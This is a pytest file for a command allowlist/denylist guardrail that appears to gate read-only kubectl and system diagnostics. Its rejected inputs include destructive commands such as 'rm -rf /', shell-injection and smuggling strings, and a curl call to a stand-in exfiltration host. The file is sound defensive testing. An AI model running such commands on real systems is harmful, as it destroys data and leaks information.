"""
Tests for app/safety.py: the read-only diagnostic-command allowlist/denylist,
including injection/smuggling attempts. This module never actually executes
anything -- these tests verify the guardrail stays airtight regardless.
"""
import pytest

from app.safety import is_command_allowed, assert_command_allowed, HARD_DENYLIST_EXAMPLES


@pytest.mark.parametrize("cmd", [
    "kubectl get pods",
    "kubectl describe pod checkout-api-abc123",
    "kubectl logs checkout-api-abc123",
    "kubectl top pods",
    "kubectl explain pod.spec",
    "df -h",
    "free -m",
    "uptime",
    "ps aux",
])
def test_allowed_read_only_commands(cmd):
    assert is_command_allowed(cmd) is True


@pytest.mark.parametrize("cmd", HARD_DENYLIST_EXAMPLES)
def test_hard_denylist_examples_rejected(cmd):
    assert is_command_allowed(cmd) is False


@pytest.mark.parametrize("cmd", [
    "kubectl delete pod checkout-api-abc123",
    "kubectl exec -it checkout-api-abc123 -- /bin/sh",
    "kubectl rollout restart deployment/checkout-api",
    "kubectl scale deployment/checkout-api --replicas=0",
    "kubectl patch deployment/checkout-api -p '{}'",
    "rm -rf /",
    "reboot",
    "shutdown -h now",
])
def test_mutating_commands_rejected(cmd):
    assert is_command_allowed(cmd) is False


@pytest.mark.parametrize("cmd", [
    "kubectl get pods; rm -rf /",
    "kubectl get pods && rm -rf /",
    "kubectl get pods | sh",
    "kubectl get pods `rm -rf /`",
    "kubectl get pods $(rm -rf /)",
    "kubectl get pods > /etc/passwd",
    "kubectl get pods\nrm -rf /",
    "kubectl --raw=/api/v1/namespaces/default/pods/foo delete",
])
def test_shell_injection_and_smuggling_attempts_rejected(cmd):
    assert is_command_allowed(cmd) is False


def test_unknown_binary_rejected():
    assert is_command_allowed("curl http://evil.example/steal") is False


def test_empty_or_whitespace_rejected():
    assert is_command_allowed("") is False
    assert is_command_allowed("   ") is False


def test_malformed_quoting_rejected():
    assert is_command_allowed('kubectl get "unterminated') is False


def test_bare_binary_with_no_subcommand_rejected():
    # kubectl has an explicit allowed-subcommand set, so a bare "kubectl"
    # with no subcommand is not a complete, verifiable read-only command.
    assert is_command_allowed("kubectl") is False


def test_assert_command_allowed_raises_for_denied_command():
    with pytest.raises(PermissionError):
        assert_command_allowed("kubectl delete pod foo")


def test_assert_command_allowed_does_not_raise_for_allowed_command():
    assert_command_allowed("kubectl get pods")  # should not raise
